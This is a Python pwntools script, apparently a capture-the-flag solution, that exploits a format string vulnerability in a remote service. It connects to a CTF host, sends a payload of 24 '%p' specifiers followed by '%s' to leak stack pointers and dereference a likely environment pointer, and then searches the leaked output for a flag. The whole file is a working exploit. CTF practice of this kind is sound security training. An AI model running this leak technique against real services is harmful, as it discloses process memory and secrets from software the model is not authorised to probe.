#!/usr/bin/env python3
#
# Exploit for the format string vulnerability.
# This script leaks the stack to find the flag.
#
# You may need to install pwntools:
# pip install pwntools
#

from pwn import *
import re

def simple_hexdump(data):
    """
    Prints a byte string in a readable hexdump format.
    This helps manually identify patterns like the flag.
    """
    if not data:
        print("(No data to display)")
        return
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_part = ' '.join(f'{b:02x}' for b in chunk)
        text_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        print(f'{i:08x}: {hex_part:<48} |{text_part}|')


def solve():
    """
    Connects to the remote service, sends the exploit payload,
    and extracts the flag.
    """
    try:
        p = remote('ctf.antix.or.id', 60902)
    except Exception as e:
        print(f"Failed to connect to the server: {e}")
        print("Please ensure the server address and port are correct and accessible.")
        return

    # --- Craft the Payload ---
    # After multiple tests, we've confirmed:
    # 1. The format string vulnerability exists.
    # 2. Positional specifiers (e.g., %6$p) are NOT supported.
    # 3. A sequential leak with `%p` works and reveals pointers on the stack.
    #
    # One of the previous leaks showed a stack pointer at the 25th offset that
    # is a strong candidate for pointing to the environment variables (`envp`),
    # where the flag is often stored.
    #
    # The new strategy is to use a chain of `%p` specifiers to advance the
    # argument pointer, and then use `%s` on the 25th argument to read the
    # string it points to.

    # Create a payload of 24 '%p's followed by one '%s'.
    # This will print the first 24 arguments as pointers, and then print the
    # string pointed to by the 25th argument.
    payload_parts = [b'%p'] * 24
    payload_parts.append(b'%s')
    payload = b'.'.join(payload_parts)


    print(f"Sending payload: {payload.decode()}")
    print(f"Payload length: {len(payload)} bytes")

    # --- Interact with the Service ---
    try:
        p.recvuntil(b"Hi, What's your name? ")
        p.sendline(payload)
        full_response_raw = p.recvall(timeout=3)
        print("Received response from server.")

    except EOFError:
        print("Connection closed unexpectedly by the server.")
        return
    finally:
        p.close()

    # --- Parse the Leaked Data ---
    full_response = full_response_raw.decode(errors='ignore')
    leak_start_marker = "Hello, "
    try:
        leak_start_index = full_response.index(leak_start_marker) + len(leak_start_marker)
        leaked_part = full_response[leak_start_index:]
    except ValueError:
        print("\n❌ Error: Could not find the start marker ('Hello, ') in the response.")
        print("Full response was:")
        print(full_response_raw)
        return

    # --- Analyze Leaked Data ---
    # The flag should now be clearly visible in the leaked output.

    print(f"\n--- Leaked Data ---")
    print(leaked_part.strip())
    print("-------------------\n")

    flag_match = re.search(r'FLAG{[^}]+}', leaked_part)

    if flag_match:
        print("🎉 Success! Flag found automatically: 🎉")
        print(flag_match.group(0))
    else:
        print("❌ Flag not found automatically.")
        print("Please inspect the leaked data above to find the flag manually.")


if __name__ == "__main__":
    solve()
